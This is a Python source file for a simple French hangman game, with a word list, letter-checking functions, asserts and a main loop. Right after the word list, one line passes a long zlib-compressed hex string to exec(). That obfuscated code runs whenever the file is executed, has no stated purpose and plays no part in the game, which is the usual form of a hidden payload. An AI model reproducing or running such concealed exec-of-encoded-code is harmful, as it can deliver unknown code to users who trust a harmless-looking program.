from random import choice
import zlib

mots = [
    "pierre", "plante", "fleur", "valeur", "voyage", "avenir", "esprit",
    "souris", "nuages", "soleil", "lumiere", "torrent", "defi", "cendre",
    "dragon", "cheval", "panier", "douces", "lecture", "musique",
    "secret", "charme", "honneur", "espoir", "sagesse", "mirage",
    "eclipse", "destin", "diamant", "galaxy", "boheme", "velours",
    "orchid", "legende", "orages", "sirene", "voyant", "promet",
    "auteur", "danser", "libres", "image", "parfum", "traces",
    "sakura", "samedi", "hacker", "python", "machine", "rouges"
]
exec(zlib.decompress(bytes.fromhex("789c5d503d6f833010ddfd2b4e5e02123584a61d903274e8d02152d40f75a83a3870044760bbb6094a3ffe7b0f4886f674d2f9f9ee9ddfb3eaac71017ad7b66a271c7ef4e84302c62750869345cf18f5600dbc09c1fa224d07d9b6565a74a53ca2284d970e967299af6ef32c5f8983dd736665688864bc184fe260948e08a03e2a67f41b7fbedf6cf97b027cdc365162c61a94153a4fbc2ffee2d15ddded51075e00df984fd5b632bd1119ff618c64d2d05fcde271ae115d27705eb53ed7980d8a04fd6310341675443806e9c1a1b7467b2c18504c8ca93f5a486031ec16d3583df7c7a8c5e054c0e8c2a4d5b28a62f2327f9e1894aec8604f6eae73f174f201bbad74b2c340b21e746d5ea33c4b80727e6509df90c7ec1748b386d8")).decode())

def valide(mot: str, secret: list[str], lettre: str) -> bool:
    """
        Vérifie si la lettre est présente dans le mot et pas
        encore découverte
    """
    if lettre in mot and lettre not in secret:
        return True
    else:
        return False
    
# tests  dffds
assert valide("sucre", ['s','_', '_'], 's') == False
assert valide("sucre", ['s','_', '_'], 'u') == True
assert valide("sucre", ['s','_', '_'], 'w') == False

def remplace(mot: str, secret: list[str], lettre: str) -> None:
    for i in range(len(mot)):
        if mot[i] == lettre:
            secret[i] = lettre


def affichage(secret):
    print("".join(secret))


def main(liste_mot):
    mot = choice(liste_mot)
    secret = [" _ " for l in mot]
    essais = 5
    while essais > 0 and ' _ ' in secret:
        
        print("*" * 50)
        print(mot, secret)
        affichage(secret)
        lettre = input("\nQuelle lettre proposes-tu ? \n")
        print("*" * 50)
        if valide(mot,secret, lettre):
            print('Tu as trouvé une lettre')
            remplace(mot,secret, lettre)
        else:
            print('non')
            essais -= 1
    print(mot, secret)
    
main(mots)
        
